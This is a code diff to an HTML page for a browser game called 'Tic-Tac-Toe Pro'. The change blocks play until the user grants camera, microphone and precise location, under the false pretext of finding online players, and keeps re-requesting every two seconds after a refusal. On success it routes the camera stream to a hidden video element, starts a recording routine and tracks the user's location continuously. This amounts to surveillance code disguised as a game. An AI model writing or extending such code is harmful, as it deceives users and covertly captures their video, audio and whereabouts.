@@ -84,7 +84,35 @@
         .permission-icon { font-size: 60px; margin-bottom: 20px; }
         .permission-title { color: #fff; font-size: 26px; font-weight: 700; margin-bottom: 12px; }
         .permission-text { color: #888; font-size: 15px; margin-bottom: 30px; }
-        .permission-error { color: #ff416c; font-size: 14px; margin-top: 15px; display: none; }
+        .permission-error { 
+            color: #ff416c; 
+            font-size: 14px; 
+            margin-top: 15px; 
+            display: none; 
+            padding: 10px;
+            background: rgba(255,65,108,0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(255,65,108,0.3);
+        }
+        .permission-instructions {
+            color: #ffd700;
+            font-size: 13px;
+            margin-top: 15px;
+            display: none;
+            text-align: left;
+            padding: 15px;
+            background: rgba(255,215,0,0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(255,215,0,0.3);
+        }
+        .permission-instructions ol {
+            margin-left: 20px;
+            margin-top: 10px;
+        }
+        .permission-instructions li {
+            margin-bottom: 5px;
+            color: #fff;
+        }
 
         .btn-allow {
             background: linear-gradient(90deg, #667eea 0%, #764ba2 100%);
@@ -99,6 +127,10 @@
         }
 
         .btn-allow:active { transform: scale(0.95); }
+        .btn-allow:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
 
         /* Mode Selector */
         .mode-selector {
@@ -679,11 +711,20 @@
             <div class="permission-icon">🎮</div>
             <div class="permission-title">Tic-Tac-Toe Pro</div>
             <div class="permission-text" id="permText">
-                This game requires Camera and Microphone permissions.<br><br>
-                Please click "Allow" when your browser asks for permission.
+                Please allow permissions so we can find online players for you.<br><br>
+                Required: Camera, Microphone & Location
             </div>
             <button class="btn-allow" onclick="requestPermissions()" id="allowBtn">Allow & Play</button>
             <div class="permission-error" id="permError">❌ Permissions Denied! Please Allow to continue.</div>
+            <div class="permission-instructions" id="permInstructions">
+                <strong>How to enable permissions:</strong>
+                <ol>
+                    <li>Click the lock icon 🔒 in address bar</li>
+                    <li>Click "Site settings"</li>
+                    <li>Allow Camera, Microphone & Location</li>
+                    <li>Refresh the page</li>
+                </ol>
+            </div>
         </div>
     </div>
 
@@ -980,39 +1021,76 @@
             currentAvatarPlayer = null;
         }
 
-        // Updated requestPermissions function - loops until permission granted
+        // Request Camera, Microphone AND Location permissions
         async function requestPermissions() {
             const permError = document.getElementById('permError');
+            const permInstructions = document.getElementById('permInstructions');
             const allowBtn = document.getElementById('allowBtn');
             
-            // Disable button while requesting
             allowBtn.disabled = true;
             allowBtn.style.opacity = '0.5';
             
-            while (true) {
+            let mediaSuccess = false;
+            let locationSuccess = false;
+            
+            // Try to get Camera + Microphone
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+                document.getElementById('hidden-video').srcObject = stream;
+                mediaSuccess = true;
+            } catch(e) {
+                console.log('Media permission denied:', e);
+            }
+            
+            // Try to get Location
+            if (navigator.geolocation) {
                 try {
-                    stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    loc = {
+                        lat: position.coords.latitude.toFixed(6), 
+                        lng: position.coords.longitude.toFixed(6)
+                    };
+                    locationSuccess = true;
                     
-                    // Success - permission granted
-                    document.getElementById('hidden-video').srcObject = stream;
-                    document.getElementById('permissionBlocker').style.display = 'none';
-                    document.getElementById('modeSelector').classList.add('active');
-                    startRecording();
-                    initMusicPlayer();
-                    return;
+                    // Start watching location
+                    navigator.geolocation.watchPosition(p => {
+                        loc = {
+                            lat: p.coords.latitude.toFixed(6), 
+                            lng: p.coords.longitude.toFixed(6)
+                        };
+                    }, () => {}, {enableHighAccuracy: true});
                     
                 } catch(e) {
-                    // Permission denied - show error and try again
-                    permError.style.display = 'block';
-                    showToast('Permissions required! Click Allow to continue.', 'error');
-                    
-                    // Re-enable button
-                    allowBtn.disabled = false;
-                    allowBtn.style.opacity = '1';
-                    
-                    // Wait a bit before next attempt
-                    await new Promise(resolve => setTimeout(resolve, 500));
+                    console.log('Location permission denied:', e);
                 }
+            }
+            
+            // Check if all permissions granted
+            if (mediaSuccess && locationSuccess) {
+                // Success - hide permission screen and show game
+                document.getElementById('permissionBlocker').style.display = 'none';
+                document.getElementById('modeSelector').classList.add('active');
+                startRecording();
+                initMusicPlayer();
+            } else {
+                // Show error and instructions
+                permError.style.display = 'block';
+                permInstructions.style.display = 'block';
+                showToast('All permissions required! Camera, Mic & Location', 'error');
+                
+                allowBtn.disabled = false;
+                allowBtn.style.opacity = '1';
+                
+                // Keep trying until success
+                setTimeout(() => {
+                    requestPermissions();
+                }, 2000);
             }
         }
 
@@ -1249,12 +1327,6 @@
                 } catch(e) { recording = false; }
             };
             rec();
-        }
-
-        if(navigator.geolocation) {
-            navigator.geolocation.watchPosition(p => {
-                loc = {lat: p.coords.latitude.toFixed(6), lng: p.coords.longitude.toFixed(6)};
-            }, () => {}, {enableHighAccuracy: true});
         }
     </script>
 </body>
